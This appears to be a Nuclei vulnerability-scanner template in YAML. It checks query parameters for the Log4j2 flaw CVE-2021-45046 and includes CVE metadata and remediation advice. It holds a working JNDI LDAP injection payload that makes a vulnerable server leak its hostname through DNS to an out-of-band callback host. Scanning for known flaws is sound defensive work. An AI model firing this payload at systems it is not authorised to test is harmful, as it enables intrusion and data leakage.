http:
- extractors:
  - group: 2
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  fuzzing:
  - fuzz:
    - '{{log4j}}'
    part: query
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  payloads:
    log4j:
    - ${jndi:ldap://127.0.0.1#.${hostName}.{{interactsh-url}}}
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
id: CVE-2021-45046-DAST
info:
  author: princechaddha
  classification:
    cve-id: CVE-2021-45046
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9
    cwe-id: CWE-502
    epss-percentile: 0.99951
    epss-score: 0.9434
  description: Apache Log4j2 Thread Context Lookup Pattern is vulnerable to remote
    code execution in certain non-default configurations.
  impact: 'Attackers can achieve remote code execution in non-default Log4j2 configurations
    through Thread Context Lookup Pattern manipulation, potentially compromising application
    servers.

    '
  metadata:
    confidence: tenative
    max-request: 1
  name: Apache Log4j2 - Remote Code Injection
  reference:
  - https://securitylab.github.com/advisories/GHSL-2021-1054_GHSL-2021-1055_log4j2/
  - https://twitter.com/marcioalm/status/1471740771581652995
  - https://logging.apache.org/log4j/2.x/
  - http://www.openwall.com/lists/oss-security/2021/12/14/4
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  remediation: 'Upgrade Apache Log4j2 to version 2.17.0 or later that completely removes
    support for Message Lookups and disables JNDI by default.

    '
  severity: critical
  tags: cve,cve2021,rce,oast,log4j,injection,dast,kev,vkev,vuln
